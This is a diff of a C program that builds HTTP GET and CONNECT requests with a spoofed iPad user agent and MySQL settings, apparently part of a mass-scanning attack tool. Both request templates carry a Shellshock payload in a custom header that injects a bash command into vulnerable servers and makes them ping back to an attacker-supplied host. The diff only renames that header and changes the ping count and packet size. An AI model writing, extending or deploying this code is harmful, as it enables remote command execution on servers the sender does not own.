@@ -27,13 +27,9 @@
 #pragma comment(lib, "pthread.lib")
 #pragma comment(lib, "libmysql.lib")
 
-#pragma comment(lib, "ws2_32.a")
-#pragma comment(lib, "pthread.a")
-#pragma comment(lib, "libmysql.a")
-
-// USERAGENT Fakeing
+// USERAGENT Fake
 #define USERAGENT "Mozilla/5.0 (iPad; CPU OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602."
-// end USERAGENT Fakeing
+// end USERAGENT Fake
 
 // Mysql Details begin
 char *mysqlhost = "localhost";
@@ -274,7 +270,7 @@ char *build_get_query(const char *host, char *page)
 {
   char *query;
   char *getpage = page;
-  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nrunaway:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 50 -s 56535 %s 0>&1 : Connection: close:\r\n\r\n";
+  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 250 -s 55635 %s 0>&1 : Connection: close:\r\n\r\n";
   
   if(getpage[0] == '/'){
     getpage = getpage + 1;
@@ -293,7 +289,7 @@ char *build_connect_query(const char *host, char *page)
 {
   char *query;
   char *getpage = page;
-  char *tpl = "CONNECT %s/%s HTTP/1.1\r\nHost: %s \r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nrunaway:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 50 -s 56535 %s 0>&1 : Connection: close:\r\n\r\n";
+  char *tpl = "CONNECT %s/%s HTTP/1.1\r\nHost: %s \r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 250 -s 55635 %s 0>&1 : Connection: close:\r\n\r\n";
   
   if(getpage[0] == '/'){
     getpage = getpage + 1;
